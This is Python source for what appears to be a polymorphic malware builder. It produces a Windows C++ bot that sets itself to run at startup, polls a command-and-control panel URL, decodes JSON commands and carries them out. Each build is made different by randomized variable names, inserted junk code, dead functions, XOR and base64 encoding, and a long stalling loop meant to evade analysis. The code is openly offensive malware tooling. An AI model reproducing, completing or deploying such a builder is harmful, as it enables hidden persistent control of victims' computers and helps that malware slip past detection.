import random, subprocess, string
from deadFunctionsObject import *
from liveFunctionsObject import *
from configs import *
from functionClass import *

#Generate default,Pages
def default_files():

    mainVarArray['define_Loop_int'] = random_string(randint(5, 7))
    ##Set the files to Callss
    ##SourceCpp
    sourceCalls = '#include "header.h"\n #include "utils.h" \n #include "configsCpp.h" \n #include "encrypthCpp.h"\n #define '+mainVarArray['define_Loop_int']+' 400000000\n'
    ##headerCpp
    headerCalls = '#pragma once\n #include <Windows.h>\n #include <wininet.h>  \n #include <Shlwapi.h> \n #include <urlmon.h>  \n #include <iomanip> \n #include <sstream> \n #include <iostream> \n #include <string> \n #include <vector> \n #include "libs/json/json.h" \n #include "libs/jsoncpp.cpp" \n #pragma comment(lib, "wininet.lib") \n #pragma comment(lib, "shlwapi.lib") \n #pragma comment(lib, "urlmon.lib") \n #define _WIN32_WINNT 0x0400 \n Json::Reader reader; \n Json::Value root; \n using namespace std; \n #include <commdlg.h>'
    ##utilsCpp
    utilsCalls = '#pragma once\n #include "header.h"\n #include "configsCpp.h" \n #include "encrypthCpp.h" \n #include "otherSmall.h" \n'
    ##otherSmall
    otherCalls = '#pragma once\n #include "Header.h" \n #include <VersionHelpers.h> \n'
    ##configsCpp
    configsCalls = '#pragma once\n'
    ##encrypthCpp
    encypthCalls = '#pragma once\n#include "header.h"\n#include "configsCpp.h" \n'

    ##Wrigth on files
    with open(sourceCpp, 'w') as fn:
        fn.write(sourceCalls)

    with open(headerCpp, 'w') as fn:
        fn.write(headerCalls)

    with open(utilsCpp, 'w') as fn:
        fn.write(utilsCalls)

    with open(otherSmallCpp, 'w') as fn:
        fn.write(otherCalls)

    with open(configsCpp, 'w') as fn:
        fn.write(configsCalls)

    with open(encrypthCpp, 'w') as fn:
        fn.write(encypthCalls)

#Build the config_file
def config_file():
    ##Ask for the Panel_key, Key, Version(hardCode), Url, PastBin_Url; Save it on an Array
    inputArray = {'panel_key': '', 'key':'', 'version':'1.0', 'main_url':'', 'pastBin_url':''}
    inputArray['panel_key'] = input("Panel key: ")
    inputArray['key'] = input("Xor key: ")
    inputArray['main_url'] = input("Main url: ")
    inputArray['pastBin_url'] = input("pastBin url: ")

    ##Build the config File, and save the varNames on the main arrayVar in a way to call it when it need;
    ##Create the main array

    configStringToAppen = ''

    ##Add Dead function (randomize the chance for it to appear)
    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],configsCpp));

    ##add some randooom deadCoode on it
    configStringToAppen = randomiZeMeHellper(random_code_gen())+'\n'

    ##add panel_key_var (probable on an compiler it don´t matter randomize var names :x #research #studing )
    mainVarArray['panel_key'] = random_string(randint(8, 12))
    configStringToAppen = configStringToAppen + "string "+mainVarArray['panel_key'] + ' = "'+ inputArray['panel_key'] +'" ;\n'

    ##Add more randommm stuufff
    configStringToAppen = configStringToAppen + randomiZeMeHellper(random_code_gen())+'\n'

    ##add key
    mainVarArray['key'] = random_string(randint(9, 16))

    ##transform the sting on array of chars and past it on main array
    ListIt = str(list(inputArray['key']))
    ListIt = ListIt.replace('[','{')
    ListIt = ListIt.replace(']','}')
    configStringToAppen = configStringToAppen + "char "+mainVarArray['key'] +'[8]'+ ' = '+ ListIt +';\n'

    ##Add more randommm stuufff
    configStringToAppen = configStringToAppen + randomiZeMeHellper(random_code_gen())+'\n'

    ##add main_url
    mainVarArray['main_url'] = random_string(randint(9, 16))
    configStringToAppen = configStringToAppen + "string "+mainVarArray['main_url'] + ' = "'+ inputArray['main_url'] +'" ;\n'

    ##Add more randommm stuufff
    configStringToAppen = configStringToAppen + randomiZeMeHellper(random_code_gen())+'\n'

    ##Add PastBin_Url
    mainVarArray['pastBin_url'] = random_string(randint(9, 16))
    configStringToAppen = configStringToAppen + "string "+mainVarArray['pastBin_url'] + ' = "'+ inputArray['pastBin_url'] +'" ;\n'

    ##Add more randommm stuufff
    configStringToAppen = configStringToAppen + randomiZeMeHellper(random_code_gen())+'\n'

    ##Append to configFile
    append_on_file_hellper(configsCpp,configStringToAppen)

##Build the encypth_file
def encypth_file():

    ##Extra Difin files
    append_on_file_hellper(encrypthCpp, '\n#define _BASE64_H_\n typedef unsigned char BYTE;\n\n')

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],encrypthCpp));


    #Base 64 decode function (randomize)
    mainLiveFuncArray['base64_decode'] = function_bulder(liveFunction[0],encrypthCpp)

    #deadFunction
    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],encrypthCpp));




    ##Add base 64 tree
    encrypthContent = 'static const string base64_chars =\n"ABCDEFGHIJKLMNOPQRSTUVWXYZ"\n"abcdefghijklmnopqrstuvwxyz"\n"0123456789+/";\n'
    encrypthContent = encrypthContent + '\n static inline bool is_base64(BYTE c) { \n return (isalnum(c) || (c == '+"'+'"+') || (c == '+"'/'"+')); \n\n }'

    #Base 64 encode (no randomize)
    mainLiveFuncArray['base64_encode'] = 'base64_encode'

    encrypthContent = encrypthContent + '\n string base64_encode(BYTE const* buf, unsigned int bufLen) {\n'
    encrypthContent = encrypthContent + 'string ret;\nint i = 0;\nint j = 0;\nBYTE char_array_3[3];\nBYTE char_array_4[4];\n'
    encrypthContent = encrypthContent + 'while (bufLen--) {\n'
    encrypthContent = encrypthContent + 'char_array_3[i++] = *(buf++);\n'
    encrypthContent = encrypthContent + 'if (i == 3) {\n'
    encrypthContent = encrypthContent + 'char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;\n'
    encrypthContent = encrypthContent + 'char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);\n'
    encrypthContent = encrypthContent + 'char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);\n'
    encrypthContent = encrypthContent + 'char_array_4[3] = char_array_3[2] & 0x3f;\n'
    encrypthContent = encrypthContent + 'for (i = 0; (i <4); i++)\n'
    encrypthContent = encrypthContent + 'ret += base64_chars[char_array_4[i]];\n'
    encrypthContent = encrypthContent + 'i = 0;\n'
    encrypthContent = encrypthContent + '}\n}\n'
    encrypthContent = encrypthContent + 'if (i)\n'
    encrypthContent = encrypthContent + '{\n'
    encrypthContent = encrypthContent + 'for (j = i; j < 3; j++)\n'
    encrypthContent = encrypthContent + 'char_array_3[j] = '+r"'\0'"+';'
    encrypthContent = encrypthContent + '\nchar_array_4[0] = (char_array_3[0] & 0xfc) >> 2;\n'
    encrypthContent = encrypthContent + 'char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);\n'
    encrypthContent = encrypthContent + 'char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);\n'
    encrypthContent = encrypthContent + 'char_array_4[3] = char_array_3[2] & 0x3f;\n'
    encrypthContent = encrypthContent + 'for (j = 0; (j < i + 1); j++)\n'
    encrypthContent = encrypthContent + 'ret += base64_chars[char_array_4[j]];\n'
    encrypthContent = encrypthContent + 'while ((i++ < 3))\n'
    encrypthContent = encrypthContent + 'ret += '+"'='"+';\n'
    encrypthContent = encrypthContent + '}'
    encrypthContent = encrypthContent + 'return ret;\n'
    encrypthContent = encrypthContent + '}\n\n'


    ##Add random Code
    encrypthContent = encrypthContent + randomiZeMeHellper(random_code_gen())+'\n'



    #append it on file
    append_on_file_hellper(encrypthCpp, encrypthContent)
    encrypthContent = ''


    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],encrypthCpp));


    ##Add reverse_char function
    mainLiveFuncArray['reverse_char'] = function_bulder(liveFunction[1],encrypthCpp)

    ##Dead function
    mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],encrypthCpp));

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],encrypthCpp));


    ##Add xor_flat function
    mainLiveFuncArray['xor_flat'] = function_bulder(liveFunction[2],encrypthCpp)

    ##Add random code
    encrypthContent = encrypthContent + randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(encrypthCpp, encrypthContent)
    encrypthContent = ''

    ##Add xor_reversed
    mainLiveFuncArray['xor_reversed'] = function_bulder(liveFunction[3],encrypthCpp)


    ##Add random code
    encrypthContent = encrypthContent + randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(encrypthCpp, encrypthContent)
    encrypthContent = ''

##Build otherSmall_file
def otherSmall_file():

    ##add random code
    otherSmallContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(otherSmallCpp, otherSmallContent)
    otherSmallContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],otherSmallCpp));


    #add get_hd_id
    mainLiveFuncArray['get_hd_id'] = function_bulder(liveFunction[4],otherSmallCpp)

    ##add random code
    otherSmallContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(otherSmallCpp, otherSmallContent)
    otherSmallContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],otherSmallCpp));


    #add escape_json
    mainLiveFuncArray['escape_json'] = function_bulder(liveFunction[5],otherSmallCpp)

    ##add random code
    otherSmallContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(otherSmallCpp, otherSmallContent)
    otherSmallContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],otherSmallCpp));


    ##add random code
    otherSmallContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(otherSmallCpp, otherSmallContent)
    otherSmallContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],otherSmallCpp));


    #add escape_json
    mainLiveFuncArray['os_version'] = function_bulder(liveFunction[6],otherSmallCpp)

    ##add random code
    otherSmallContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(otherSmallCpp, otherSmallContent)
    otherSmallContent = ''

##Build main source file :))
def utils_file():

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],utilsCpp));


    #add encode constructor
    mainLiveFuncArray['encode_constructor'] = function_bulder(liveFunction[7],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''


    #Add dead function to it
    mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],utilsCpp));


    #add encode constructor
    mainLiveFuncArray['decode_constructor'] = function_bulder(liveFunction[8],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    #add encode constructor
    #mainLiveFuncArray['add_to_start_up'] = function_bulder(liveFunction[13],utilsCpp)

    #add encode constructor
    mainLiveFuncArray['change_directory_add_to_start_up'] = function_bulder(liveFunction[14],utilsCpp)

    ##Append to file
    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    #add encode constructor
    mainLiveFuncArray['url_Cunstructor'] = function_bulder(liveFunction[9],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],utilsCpp));



    #add http_request
    mainLiveFuncArray['http_request'] = function_bulder(liveFunction[10],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    #add encode constructor
    mainLiveFuncArray['start_up'] = function_bulder(liveFunction[11],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],utilsCpp));


    #add encode constructor
    mainLiveFuncArray['command_constructor'] = function_bulder(liveFunction[12],utilsCpp)

    utilsContent = randomiZeMeHellper(random_code_gen())+'\n'
    ##Append to file
    append_on_file_hellper(utilsCpp, utilsContent)
    utilsContent = ''

    if(randint(0,1) == 1):
        mainDeadFuncArray.append(function_bulder(deadFunction[randint(0, len(deadFunction)-1)],utilsCpp));

##Build source file (the last one)
def source_file():


    ##Declare all vars
    mainVarArray['main_buffer'] = random_string(randint(15, 25))
    mainVarArray['main_url_string'] = random_string(randint(15, 25))
    mainVarArray['main_url_char'] = random_string(randint(15, 25))
    mainVarArray['main_json_decode_buffer'] = random_string(randint(15, 25))
    mainVarArray['loop_zero_int'] = random_string(randint(15, 25))

    ##int
    sourceMainContent = "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
    sourceMainContent = sourceMainContent + "int "+mainVarArray['loop_zero_int']+"=0;"
    sourceMainContent = sourceMainContent + "\n for (int i = 0; i < "+mainVarArray['define_Loop_int']+"; i++){\n"
    sourceMainContent = sourceMainContent + ""+mainVarArray['loop_zero_int']+"++;\n"
    sourceMainContent = sourceMainContent + "}\n"

    sourceMainContent = sourceMainContent + "if("+mainVarArray['loop_zero_int']+"=="+mainVarArray['define_Loop_int']+"){\n"

    ##Append to file
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


    ##Random Code
    sourceMainContent = randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''



    ##Main logic
    sourceMainContent = "while (1) {\n"
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"char &mainArray_main_buffer[256] = { 0 };") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"string &mainArray_main_url_string = &livefunction_url_constructor(&livefunction_base64_decode(&mainArray_main_url_config));") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"char *&mainArray_main_url_char = (char *)&mainArray_main_url_string.c_str();") +'\n'


    ##Wrigth on files
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


    #random Call Dead Function
    append_on_file_hellper(sourceCpp, mainDeadFuncArray[randint(0, len(mainDeadFuncArray)-1)]+';\n')



    ##Random Code
    sourceMainContent = randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


    #random Call Dead Function
    append_on_file_hellper(sourceCpp, mainDeadFuncArray[randint(0, len(mainDeadFuncArray)-1)]+';\n')

    #Main Logic_2 -> add to start_up
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"&liveFunction_change_directory_add_to_start_up();") +'\n'
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''

    sourceMainContent = sourceMainContent + replace_array_vars_function(r"&livefunction_http_request((char *)&mainArray_main_url_char, &mainArray_main_buffer, sizeof(&mainArray_main_buffer));") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"string &mainArray_main_json_decode_buffer = &livefunction_decode_constructor((string)&mainArray_main_buffer);") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function("Sleep(1 * "+ str(randint(10, 70)) +" * 1000);") +'\n'
    ##Wrigth on files
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


    #random Call Dead Function
    append_on_file_hellper(sourceCpp, mainDeadFuncArray[randint(0, len(mainDeadFuncArray)-1)]+';\n')



    ##Random Code
    sourceMainContent = randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


    #Main Logic_3
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"&livefunction_action_constructor(&mainArray_main_json_decode_buffer);") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"Sleep(1 * "+ str(randint(10, 70)) +" * 1000);") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"};") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"};") +'\n'
    sourceMainContent = sourceMainContent + replace_array_vars_function(r"};") +'\n'


    ##Wrigth on files
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''

    ##Random Code
    sourceMainContent = randomiZeMeHellper(random_code_gen())+'\n'
    append_on_file_hellper(sourceCpp, sourceMainContent)
    sourceMainContent = ''


######################################################################Start Build elementes############################################################S
##Set files default
default_files();

##Build the config_file
config_file()

##Build the encypth_file
encypth_file()

##Build otherSmall_file
otherSmall_file()

##Build main util file :))
utils_file()

##Build source file (the last one)
source_file()



print("Ok its done")


#C:\Users\Filipe\Desktop\Server>MSBuild.exe Server.sln /p:DebugSymbols=false /p:DebugType=None /p:Configuration=Release
#cmd = ["g++", 'CFile.cpp',];
#p = subprocess.Popen(cmd);
#p.wait();
#subprocess.call(["./"+'a.out']);
